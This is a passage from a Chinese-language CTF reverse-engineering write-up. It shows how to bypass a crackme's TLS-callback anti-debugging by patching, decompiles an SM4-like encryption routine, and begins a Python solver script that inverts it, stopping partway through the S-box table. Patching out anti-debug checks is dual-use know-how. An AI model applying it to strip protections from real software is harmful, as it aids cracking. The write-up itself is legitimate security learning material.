class="number">0</span>;</span><br><span class="line">  CurrentProcess = GetCurrentProcess();</span><br><span class="line">  CheckRemoteDebuggerPresent(CurrentProcess, &amp;pbDebuggerPresent);</span><br><span class="line">  <span class="keyword">if</span> ( pbDebuggerPresent )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  dword_1AD724 = (<span class="type">int</span>)&amp;loc_1A1855;</span><br><span class="line">  result = &amp;loc_1A1896 - &amp;loc_1A1855;</span><br><span class="line">  dword_1AD728 = &amp;loc_1A1896 - &amp;loc_1A1855;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里利用了TLS回调函数加载先于主模块main入口的特性，检查到调试直接退出了。我们将PE头datadir中的tls部分全部patch掉，然后将文件中rdata部分的tls回调函数表也全patch掉（都写成0），程序就能调试了。</p><p>另外，x64dbg首选项开了在tls回调中断，但是这里没有检测，估计是因为用了一个jmp直接跳隐藏call tls函数。</p><h2 id="加密函数">加密函数</h2><p>加密函数也是用了上面的混淆指令和jmp隐藏的混淆，首先看主函数逻辑，它读取一个长32的字符串然后按照前16和后16分别加密两次，每次加密完后和预设的结果比较。然后patch堆栈花指令后跟进加密函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">__int64 __cdecl <span class="title function_">encrypt</span><span class="params">(<span class="type">int</span> arr1, <span class="type">char</span> *input_0_16_32, _DWORD *arr0)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+DCh] [ebp-C8h]</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">3</span>]; <span class="comment">// [esp+E8h] [ebp-BCh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6[<span class="number">3</span>]; <span class="comment">// [esp+F4h] [ebp-B0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">12</span>]; <span class="comment">// [esp+100h] [ebp-A4h] BYREF</span></span><br><span class="line">  <span class="type">int</span> int0; <span class="comment">// [esp+10Ch] [ebp-98h] BYREF</span></span><br><span class="line">  <span class="type">int</span> int4; <span class="comment">// [esp+110h] [ebp-94h] BYREF</span></span><br><span class="line">  <span class="type">int</span> int8; <span class="comment">// [esp+114h] [ebp-90h] BYREF</span></span><br><span class="line">  _DWORD int16[<span class="number">34</span>]; <span class="comment">// [esp+118h] [ebp-8Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(byte_D8F0A2);</span><br><span class="line">  int0 = *(_DWORD *)input_0_16_32;</span><br><span class="line">  int4 = *((_DWORD *)input_0_16_32 + <span class="number">1</span>);</span><br><span class="line">  int8 = *((_DWORD *)input_0_16_32 + <span class="number">2</span>);</span><br><span class="line">  int16[<span class="number">0</span>] = *((_DWORD *)input_0_16_32 + <span class="number">3</span>);</span><br><span class="line">  j_init_enc(arr1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    j_xor_0x12(&amp;int4 + i, &amp;int16[i - <span class="number">1</span>], &amp;int16[i], &amp;result[i], v7, <span class="number">4</span>);</span><br><span class="line">    j_Sbox_substitution((<span class="type">int</span>)v7, (<span class="type">int</span>)v6, <span class="number">4</span>);</span><br><span class="line">    v5[<span class="number">0</span>] = ((v6[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> <span class="type">int</span>)v6[<span class="number">0</span>] &gt;&gt; <span class="number">8</span>)) ^ ((v6[<span class="number">0</span>] &lt;&lt; <span class="number">18</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> <span class="type">int</span>)v6[<span class="number">0</span>] &gt;&gt; <span class="number">14</span>)) ^ ((v6[<span class="number">0</span>] &lt;&lt; <span class="number">10</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> <span class="type">int</span>)v6[<span class="number">0</span>] &gt;&gt; <span class="number">22</span>)) ^ v6[<span class="number">0</span>] ^ ((<span class="number">4</span> * v6[<span class="number">0</span>]) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> <span class="type">int</span>)v6[<span class="number">0</span>] &gt;&gt; <span class="number">30</span>));</span><br><span class="line">    j_xor_0x34((<span class="type">int</span>)(&amp;int0 + i), (<span class="type">int</span>)v5, (<span class="type">int</span>)&amp;int16[i + <span class="number">1</span>], <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *arr0 = int16[<span class="number">32</span>];</span><br><span class="line">  arr0[<span class="number">1</span>] = int16[<span class="number">31</span>];</span><br><span class="line">  arr0[<span class="number">2</span>] = int16[<span class="number">30</span>];</span><br><span class="line">  arr0[<span class="number">3</span>] = int16[<span class="number">29</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xC00000000</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在循环之前，主加密函数还调用了另一个函数，跟进去再看，发现是个类似的加密函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">init_enc</span><span class="params">(<span class="type">int</span> arr1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+DCh] [ebp-C8h]</span></span><br><span class="line">  <span class="type">int</span> v3[<span class="number">3</span>]; <span class="comment">// [esp+E8h] [ebp-BCh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4[<span class="number">3</span>]; <span class="comment">// [esp+F4h] [ebp-B0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> tmp_arr2[<span class="number">12</span>]; <span class="comment">// [esp+100h] [ebp-A4h] BYREF</span></span><br><span class="line">  <span class="type">int</span> tmp_arr[<span class="number">37</span>]; <span class="comment">// [esp+10Ch] [ebp-98h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(byte_D8F0A2);</span><br><span class="line">  j_xor_0x34(arr1, (<span class="type">int</span>)data_16bytes, (<span class="type">int</span>)tmp_arr, <span class="number">16</span>);<span class="comment">// 初始轮密钥</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    j_xor_0x12(&amp;tmp_arr[i + <span class="number">1</span>], &amp;tmp_arr[i + <span class="number">2</span>], &amp;tmp_arr[i + <span class="number">3</span>], &amp;data_128bytes[i], tmp_arr2, <span class="number">4</span>);</span><br><span class="line">    j_Sbox_substitution((<span class="type">int</span>)tmp_arr2, (<span class="type">int</span>)v4, <span class="number">4</span>);</span><br><span class="line">    v3[<span class="number">0</span>] = ((v4[<span class="number">0</span>] &lt;&lt; <span class="number">23</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> <span class="type">int</span>)v4[<span class="number">0</span>] &gt;&gt; <span class="number">9</span>)) ^ v4[<span class="number">0</span>] ^ ((v4[<span class="number">0</span>] &lt;&lt; <span class="number">13</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> <span class="type">int</span>)v4[<span class="number">0</span>] &gt;&gt; <span class="number">19</span>));</span><br><span class="line">    j_xor_0x34((<span class="type">int</span>)&amp;tmp_arr[i], (<span class="type">int</span>)v3, (<span class="type">int</span>)&amp;tmp_arr[i + <span class="number">4</span>], <span class="number">4</span>);</span><br><span class="line">    result[i] = tmp_arr[i + <span class="number">4</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中间的小函数一路跟进去就能看懂功能，<code>xor_0x12</code>是将参数123和一个预设的数组按字节异或之后再异或0x12存放至参数4，里面有个异或0没用。我们可以注意到最后一个参数永远是4，其实就是按int进行4字节的异或。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">xor_0x12</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, <span class="type">int</span> const_4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; const_4; ++i )</span><br><span class="line">    *(_BYTE *)(i + a5) = const_0_d8d720 ^ *(_BYTE *)(i + a4) ^ *(_BYTE *)(i + a3) ^ *(_BYTE *)(i + a2) ^ *(_BYTE *)(i + a1) ^ <span class="number">0x12</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个函数很明显是一个代换，S盒写好了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">Sbox_substitution</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-38h]</span></span><br><span class="line">  __CheckForDebuggerJustMyCode(byte_D8F0A2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a3; ++i )</span><br><span class="line">    *(_BYTE *)(i + a2) = Sbox[<span class="number">16</span> * ((<span class="type">int</span>)*(<span class="type">unsigned</span> __int8 *)(i + a1) &gt;&gt; <span class="number">4</span>) + (*(_BYTE *)(i + a1) &amp; <span class="number">0xF</span>)];</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三步是代换后的结果进行一系列位运算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3[<span class="number">0</span>] = ((v4[<span class="number">0</span>] &lt;&lt; <span class="number">23</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> <span class="type">int</span>)v4[<span class="number">0</span>] &gt;&gt; <span class="number">9</span>)) ^ v4[<span class="number">0</span>] ^ ((v4[<span class="number">0</span>] &lt;&lt; <span class="number">13</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> <span class="type">int</span>)v4[<span class="number">0</span>] &gt;&gt; <span class="number">19</span>));</span><br></pre></td></tr></table></figure><p>最后异或0x34:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">xor_0x34</span><span class="params">(<span class="type">int</span> arr1, <span class="type">int</span> arr_d8d700, <span class="type">int</span> arr_enc5, <span class="type">int</span> const_16)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; const_16; ++i )</span><br><span class="line">    *(_BYTE *)(i + arr_enc5) = const_0_d8d720 ^ *(_BYTE *)(i + arr_d8d700) ^ *(_BYTE *)(i + arr1) ^ <span class="number">0x34</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后结果存放到一个数组里。</p><h2 id="控制流分析">控制流分析</h2><p>我们可以注意到，第一个调用的相似结构的加密函数里面没有涉及任何我们的输入操作，其结果存放在数组中后再进行外层的加密处理。因此patch掉反调试之后，我们可以直接过掉这个函数然后把数组里面的东西直接导出来看外层。动调时候获得的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">00</span>D8D730 ; <span class="type">int</span> result[<span class="number">32</span>]</span><br><span class="line">.data:<span class="number">00</span>D8D730 result          dd <span class="number">0F</span>F055A4Eh, <span class="number">529</span>CC66Ah, <span class="number">18E3</span>DA43h, <span class="number">465E0</span>E4h, <span class="number">0F</span>D58BCB6h</span><br><span class="line">.data:<span class="number">00</span>D8D730                                         ; DATA XREF: init_enc+<span class="number">15F</span>↑w</span><br><span class="line">.data:<span class="number">00</span>D8D730                                         ; encrypt+FB↑o</span><br><span class="line">.data:<span class="number">00</span>D8D744                 dd <span class="number">2</span>C4E97ECh, <span class="number">48</span>A234B8h, <span class="number">842</span>EE158h, <span class="number">7</span>C55AA74h, <span class="number">9B</span>EF3AFEh</span><br><span class="line">.data:<span class="number">00</span>D8D758                 dd <span class="number">8779F</span>E09h, <span class="number">1685B</span>020h, <span class="number">95794366</span>h, <span class="number">7</span>AC1501Fh, <span class="number">7F</span>B0D538h</span><br><span class="line">.data:<span class="number">00</span>D8D76C                 dd <span class="number">38980B</span>16h, <span class="number">33</span>D37C51h, <span class="number">5F</span>AACC9Bh, <span class="number">0</span>D47351CCh, <span class="number">48</span>CEEAB2h</span><br><span class="line">.data:<span class="number">00</span>D8D780                 dd <span class="number">7</span>C296054h, <span class="number">0F</span>163D1EFh, <span class="number">0</span>DDB1E47h, <span class="number">9</span>DA4F767h, <span class="number">0F</span>AF4B1E0h</span><br><span class="line">.data:<span class="number">00</span>D8D794                 dd <span class="number">0F</span>C5A5FB1h, <span class="number">0</span>D3FED672h, <span class="number">264B</span>1A75h, <span class="number">0</span>EFA7E6C4h, <span class="number">94B</span>344A4h</span><br><span class="line">.data:<span class="number">00</span>D8D7A8                 dd <span class="number">0</span>ED19375Fh, <span class="number">58</span>AA0CEDh</span><br></pre></td></tr></table></figure><p>函数功能逆完之后流程就比较简单了，他是一个流式加密的方法，一共用到36字节空间，但是每次异或加密等操作的时候都按int型处理（连续4字节一个单位），取输入的前4个字节做初始向量，经过以下步骤循环32轮后得到密文：</p><ol><li class="lvl-3"><p>从输入的input[1]算起, 当前的连续三个单位（滚动向前，123）和result数组轮数对应位置的值进行异或得到中间结果a</p></li><li class="lvl-3"><p>以a为索引（高4位行低4位列）进行S盒代换得到结果b</p></li><li class="lvl-3"><p>对b进行指定的移位、按位或和异或操作得到结果c</p></li><li class="lvl-3"><p>将c，input[0]（滚动向前，0）算起的一个单位异或，存放至单位4，完成一轮操作</p></li><li class="lvl-3"><p>循环32次直至拿到最后的4个4字节int值，倒序赋值并返回获得16字节加密结果</p></li></ol><h1>解密</h1><p>我们知道异或操作是可逆的，破解这个加密算法其实并不困难，只需要从最后四字节倒着推回去就行了。我们知道最后新的字节的获得是0号单位和s盒替换后又做了位运算的值异或得到的，有后四个单位的值和运算，我们就要拿到S盒的下标。因此只需要用前三个值和导出的result数组先异或0x12拿到下标，S盒代换再位运算，最后获得的值和0x34与最后一个值异或就能往前推一位，倒着重复32次就能拿到输入了。</p><p>EXP如下，很多导出的数据都没有用，因为动调直接跳过了一个大的初始加密环节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 由一个encrypt函数定义一轮加密，一轮加密分几个步骤</span></span><br><span class="line"><span class="comment"># 首先按int取出输入(int)input[0], input[1], input[2], input[3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enc3: 接收3个数组和一个常量16，将12数组的0-16下标（按char）对应异或后再异或0x34存至3，3为上级</span></span><br><span class="line"><span class="comment"># 调用者创建的局部数组，12来自更早，16个char，4个int，反正都一样</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后刚刚得到了16个字节的结果，按照4,8,12和一个固定数组的顺序传入，全部异或再异或0x12</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># const1_16bytes=[0xC6, 0xBA, 0xB1, 0xA3, 0x50, 0x33, 0xAA, 0x56, 0x97, 0x91,0x7D, 0x67, 0xDC, 0x22, 0x70, 0xB2]</span></span><br><span class="line"><span class="comment"># const2_128bytes=[  0x15, 0x0E, 0x07, 0x00, 0x31, 0x2A, 0x23, 0x1C, 0x4D, 0x46, </span></span><br><span class="line"><span class="comment">#   0x3F, 0x38, 0x69, 0x62, 0x5B, 0x54, 0x85, 0x7E, 0x77, 0x70, </span></span><br><span class="line"><span class="comment">#   0xA1, 0x9A, 0x93, 0x8C, 0xBD, 0xB6, 0xAF, 0xA8, 0xD9, 0xD2, </span></span><br><span class="line"><span class="comment">#   0xCB, 0xC4, 0xF5, 0xEE, 0xE7, 0xE0, 0x11, 0x0A, 0x03, 0xFC, </span></span><br><span class="line"><span class="comment">#   0x2D, 0x26, 0x1F, 0x18, 0x49, 0x42, 0x3B, 0x34, 0x65, 0x5E, </span></span><br><span class="line"><span class="comment">#   0x57, 0x50, 0x81, 0x7A, 0x73, 0x6C, 0x9D, 0x96, 0x8F, 0x88, </span></span><br><span class="line"><span class="comment">#   0xB9, 0xB2, 0xAB, 0xA4, 0xD5, 0xCE, 0xC7, 0xC0, 0xF1, 0xEA, </span></span><br><span class="line"><span class="comment">#   0xE3, 0xDC, 0x0D, 0x06, 0xFF, 0xF8, 0x29, 0x22, 0x1B, 0x14, </span></span><br><span class="line"><span class="comment">#   0x45, 0x3E, 0x37, 0x30, 0x61, 0x5A, 0x53, 0x4C, 0x7D, 0x76, </span></span><br><span class="line"><span class="comment">#   0x6F, 0x68, 0x99, 0x92, 0x8B, 0x84, 0xB5, 0xAE, 0xA7, 0xA0, </span></span><br><span class="line"><span class="comment">#   0xD1, 0xCA, 0xC3, 0xBC, 0xED, 0xE6, 0xDF, 0xD8, 0x09, 0x02, </span></span><br><span class="line"><span class="comment">#   0xFB, 0xF4, 0x25, 0x1E, 0x17, 0x10, 0x41, 0x3A, 0x33, 0x2C, </span></span><br><span class="line"><span class="comment">#   0x5D, 0x56, 0x4F, 0x48, 0x79, 0x72, 0x6B, 0x64]</span></span><br><span class="line"></span><br><span class="line">Sbox=[<span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>, </span><br><span class="line">  <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>, <span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>, </span><br><span class="line">  <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, </span><br><span class="line">  <span class="number">0x06</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0xE4</span>, <span class="number">0xB3</span>, </span><br><span class="line">  <span class="number">0x1C</span>, <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, </span><br><span class="line">  <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>, <span class="number">0xF3</span>, <span class="number">0x73</span>, </span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>, </span><br><span class="line">  <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, </span><br><span class="line">  <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>, </span><br><span class="line">  <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, </span><br><span class="line">  <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, </span><br><span class="line">  <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xEA</span>, <span class="number">0xBF</span>, </span><br><span class="line">  <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>, <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>, </span><br><span class="line">  <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>, </span><br><span class="line">  <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>, </span><br><span class="line">  <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>, </span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, </span><br><span class="line">  <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, </span><br><span class="line">  <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>, </span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>, </span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>, </span><br><span class="line">  <span class="number">0xB8</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>, </span><br><span class="line">  <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, </span><br><span class="line">  <span 